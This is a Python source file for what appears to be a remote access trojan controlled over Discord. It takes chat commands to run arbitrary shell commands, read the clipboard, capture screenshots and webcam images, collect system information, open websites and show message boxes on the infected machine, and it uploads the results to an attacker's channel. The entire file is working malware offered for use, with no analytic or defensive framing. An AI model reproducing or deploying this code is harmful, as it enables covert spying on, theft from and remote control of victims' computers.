import os

import discord

from laozi.payloads.systeminfo import get_sys_info
from laozi.payloads.clipboard import get_clipboard
from laozi.payloads.screenshot import get_screenshot
from laozi.payloads.webcam import get_webcam_snapshot
from laozi.payloads.website import open_website
from laozi.payloads.messagebox import display_messagebox


def load_environment_variables(file_path="../.env"):
    with open(file_path) as f:
        for line in f:
            if line.strip() and not line.startswith("#"):
                key, value = line.split("=", 1)
                os.environ[key.strip()] = value.strip()


class DiscordBotClient(discord.Client):
    def __init__(self, target_channel_id, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.target_channel_id = target_channel_id

    async def on_ready(self):
        channel = self.get_channel(self.target_channel_id)
        if channel:
            commands = [
                "!alert       <message>  -> Trigger message box",
                "!clipboard              -> Get clipboard content",
                "!execute     <command>  -> Execute a shell command",
                "!screenshot             -> Take a screenshot",
                "!sysinfo                -> Get system information",
                "!webcam                 -> Get webcam snapshot",
                "!website     <url>      -> Open a website"
            ]
            command_text = "\n".join(sorted(commands))
            await channel.send(f"@everyone Hello!\nHere are the available commands:\n```{command_text}```")

    async def on_message(self, message):
        if message.author == self.user:
            return

        command, *args = message.content.strip().split(maxsplit=1)
        args = args[0] if args else ""

        commands = {
            "!sysinfo": self.handle_system_info,
            "!execute": self.execute_shell_command,
            "!alert": self.trigger_messagebox,
            "!clipboard": self.handle_clipboard,
            "!website": open_website,
            "!webcam": self.handle_webcam_snapshot,
            "!screenshot": self.handle_screenshot,
        }

        handler = commands.get(command)
        only_one_arg = ["!execute", "!alert", "!website"]
        if handler:
            if command in only_one_arg:
                handler(args)
            else:
                await handler(message.channel, args)

    async def handle_system_info(self, channel, _):
        sys_info = get_sys_info()
        lines = sys_info.split("\n", 7)
        basic = "\n".join(lines[:7])
        detailed = "\n".join(lines[7:])

        with open("detailed_sys_info.txt", "w") as f:
            f.write(detailed)

        await channel.send(f"```{basic}```")
        await channel.send(file=discord.File("detailed_sys_info.txt"))
        os.remove("detailed_sys_info.txt")

    async def handle_clipboard(self, channel, _):
        clipboard_content = get_clipboard() or "Clipboard is empty or unavailable."
        await channel.send(f"Clipboard content:\n```{clipboard_content}```")

    async def handle_webcam_snapshot(self, channel, _):
        webcam_snapshot = get_webcam_snapshot()
        if webcam_snapshot:
            await channel.send(file=discord.File(webcam_snapshot))
            os.remove(webcam_snapshot)
        else:
            await channel.send("Failed to capture screenshot.")

    async def handle_screenshot(self, channel, _):
        screenshot = get_screenshot()
        if screenshot:
            await channel.send(file=discord.File(screenshot))
            os.remove(screenshot)
        else:
            await channel.send("Failed to capture screenshot.")

    @staticmethod
    def execute_shell_command(command):
        os.system(command)

    @staticmethod
    def trigger_messagebox(message_text):
        display_messagebox(message_text, "System Alert", "info")


if __name__ == '__main__':
    load_environment_variables()
    bot_token = os.getenv("DISCORD_BOT_TOKEN")
    channel_id = int(os.getenv("CHANNEL_ID"))

    bot_intents = discord.Intents.default()
    bot_intents.message_content = True

    discord_client = DiscordBotClient(target_channel_id=channel_id, intents=bot_intents)
    discord_client.run(bot_token)
